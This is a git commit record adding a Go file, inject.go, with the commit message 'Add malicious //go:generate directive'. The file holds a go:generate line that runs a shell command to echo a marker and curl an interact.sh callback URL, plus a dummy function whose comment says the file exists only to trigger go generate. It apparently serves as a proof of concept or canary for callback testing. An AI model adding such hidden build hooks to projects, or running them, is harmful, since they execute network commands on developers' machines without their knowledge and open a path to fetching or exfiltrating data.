99a4533dd9009759e6fdef6027bdb94a5ae9ebe9
sanling1 <504767574@qq.com>
2026-04-20 09:53:13 +0800

    Add malicious //go:generate directive

---
+++ inject.go
@@ -0,0 +1,8 @@
+package main
+
+//go:generate sh -c "echo 'hb-go-gen-test' && curl -s https://interact.sh/hb-go-gen-test || true"
+
+// Dummy function
+func Dummy() {
+    // This file is just to trigger go generate execution
+}
